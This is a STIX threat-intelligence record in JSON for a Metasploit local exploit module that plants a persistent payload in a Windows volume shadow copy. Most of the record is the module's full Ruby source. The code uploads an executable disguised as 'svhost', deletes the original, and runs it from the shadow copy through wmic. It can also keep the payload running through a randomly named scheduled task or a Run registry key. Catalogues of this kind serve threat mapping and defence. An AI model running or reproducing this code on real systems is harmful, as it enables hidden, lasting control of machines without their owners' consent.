{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92379888-4e10-44af-9db1-82b655968d75",
    "created": "2024-08-14T16:49:32.239809Z",
    "modified": "2024-08-14T16:49:32.239813Z",
    "name": "Persistent Payload in Windows Volume Shadow Copy",
    "description": " This module will attempt to create a persistent payload in a new volume shadow copy. This is based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY option, the user should need password in order to start session on the target machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/vss_persistence.rb",
            "external_id": "vss_persistence.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20201111212952/https://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/"
        },
        {
            "source_name": "reference",
            "url": "http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::ShadowCopy\n  include Msf::Post::Windows::Registry\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::TaskScheduler\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Persistent Payload in Windows Volume Shadow Copy',\n        'Description' => %q{\n          This module will attempt to create a persistent payload in a new volume shadow copy. This is\n          based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has\n          been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY\n          option, the user should need password in order to start session on the target machine.\n        },\n        'Author' => ['Jedediah Rodriguez <Jedi.rodriguez[at]gmail.com>'], # @MrXors\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [ [ 'Microsoft Windows', {} ] ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'URL', 'https://web.archive.org/web/20201111212952/https://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/' ],\n          [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']\n        ],\n        'DisclosureDate' => '2011-10-21',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_sysinfo\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\\\']),\n        OptBool.new('EXECUTE', [ true, 'Run the EXE on the remote system.', true]),\n        OptBool.new('SCHTASK', [ true, 'Create a Scheduled Task for the EXE.', false]),\n        OptBool.new('RUNKEY', [ true, 'Create AutoRun Key for the EXE', false]),\n        OptInt.new('DELAY', [ true, 'Delay in Minutes for Reconnect attempt. Needs SCHTASK set to true to work. Default delay is 1 minute.', 1]),\n        OptString.new('RPATH', [ false, 'Path on remote system to place Executable. Example: \\\\\\\\Windows\\\\\\\\Temp (DO NOT USE C:\\\\ in your RPATH!)', ]),\n      ]\n    )\n\n    # All these task scheduler options are already managed by the module or are not possible (e.i. remote task scheduling)\n    deregister_options('ScheduleType', 'ScheduleModifier', 'ScheduleRemoteSystem', 'ScheduleUsername', 'SchedulePassword')\n  end\n\n  def exploit\n    @clean_up = ''\n\n    print_status('Checking requirements...')\n\n    unless is_admin?\n      print_error('This module requires admin privs to run')\n      return\n    end\n\n    unless is_high_integrity?\n      print_error('This module requires UAC to be bypassed first')\n      return\n    end\n\n    print_status('Starting Volume Shadow Service...')\n    unless start_vss\n      print_error('Unable to start the Volume Shadow Service')\n      return\n    end\n\n    print_status('Uploading payload...')\n    remote_file = upload(datastore['RPATH'])\n\n    print_status('Creating Shadow Volume Copy...')\n    unless volume_shadow_copy\n      fail_with(Failure::Unknown, 'Failed to create a new shadow copy')\n    end\n\n    print_status('Finding the Shadow Copy Volume...')\n    volume_data_id = []\n    cmd = 'cmd.exe /c vssadmin List Shadows| find \"Shadow Copy Volume\"'\n    output = cmd_exec(cmd)\n    output.each_line do |line|\n      cmd_regex = /HarddiskVolumeShadowCopy\\d{1,9}/.match(line.to_s)\n      volume_data_id = cmd_regex.to_s\n    end\n\n    print_status('Deleting malware...')\n    file_rm(remote_file)\n\n    if datastore['EXECUTE']\n      print_status(\"Executing #{remote_file}...\")\n      execute(volume_data_id, remote_file)\n    end\n\n    if datastore['SCHTASK']\n      print_status('Creating Scheduled Task...')\n      schtasks(volume_data_id, remote_file)\n    end\n\n    if datastore['RUNKEY']\n      print_status('Installing as autorun in the registry...')\n      install_registry(volume_data_id, remote_file)\n    end\n\n    unless @clean_up.empty?\n      log_file\n    end\n  end\n\n  def upload(trg_loc = '')\n    if trg_loc.nil? || trg_loc.empty?\n      location = '\\\\Windows\\\\Temp'\n    else\n      location = trg_loc\n    end\n\n    file_name = \"svhost#{rand(100)}.exe\"\n    file_on_target = \"#{location}\\\\#{file_name}\"\n\n    exe = generate_payload_exe\n\n    begin\n      write_file(file_on_target.to_s, exe)\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NotFound, e.message)\n    end\n\n    return file_on_target\n  end\n\n  def volume_shadow_copy\n    begin\n      id = create_shadowcopy(datastore['VOLUME'])\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NotFound, e.message)\n    end\n\n    if id\n      return true\n    else\n      return false\n    end\n  end\n\n  def execute(volume_id, exe_path)\n    run_cmd = \"cmd.exe /c %SYSTEMROOT%\\\\system32\\\\wbem\\\\wmic.exe process call create \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\#{volume_id}\\\\#{exe_path}\"\n    cmd_exec(run_cmd)\n  end\n\n  TaskSch = Msf::Post::Windows::TaskScheduler\n\n  def schtasks(volume_id, exe_path)\n    sch_name = Rex::Text.rand_text_alpha(rand(8..15))\n    global_root = \"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\#{volume_id}\\\\#{exe_path}\"\n    begin\n      task_create(sch_name, global_root, { task_type: 'MINUTE', modifier: datastore['DELAY'] })\n    rescue TaskSchedulerObfuscationError => e\n      print_warning(e.message)\n      print_good('Task created without obfuscation')\n    rescue TaskSchedulerError => e\n      print_error(\"Task creation error: #{e}\")\n      return\n    else\n      print_good('Task created')\n      if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'\n        @clean_up << \"reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\\\') { '\\\\\\\\' }}\\\\\\\\#{sch_name}' \"\\\n                     \"-v '#{TaskSch::TASK_SD_REG_VALUE}' \"\\\n                     \"-d '#{TaskSch::DEFAULT_SD}' \"\\\n                     \"-t 'REG_BINARY'#{\" -w '64'\" unless @old_os}\\n\"\n      end\n    end\n\n    @clean_up << \"execute -H -f cmd.exe -a \\\"/c schtasks.exe /delete /tn #{sch_name} /f\\\"\\n\"\n  end\n\n  def install_registry(volume_id, exe_path)\n    global_root = \"cmd.exe /c %SYSTEMROOT%\\\\system32\\\\wbem\\\\wmic.exe process call create \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\#{volume_id}\\\\#{exe_path}\"\n    nam = Rex::Text.rand_text_alpha(rand(8..15))\n    hklm_key = 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n    print_status(\"Installing into autorun as #{hklm_key}\\\\#{nam}\")\n    res = registry_setvaldata(hklm_key.to_s, nam, global_root.to_s, 'REG_SZ')\n    if res\n      print_good(\"Installed into autorun as #{hklm_key}\\\\#{nam}\")\n      @clean_up << \"reg  deleteval -k HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run -v #{nam}\\n\"\n    else\n      print_error('Error: failed to open the registry key for writing')\n    end\n  end\n\n  def clean_data\n    host = session.sys.config.sysinfo['Computer']\n    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')\n    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))\n    ::FileUtils.mkdir_p(logs)\n    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'\n    return logfile\n  end\n\n  def log_file\n    clean_rc = clean_data\n    file_local_write(clean_rc, @clean_up)\n    print_status(\"Cleanup Meterpreter RC File: #{clean_rc}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-21",
    "x_mitre_platforms": [
        "['win']"
    ]
}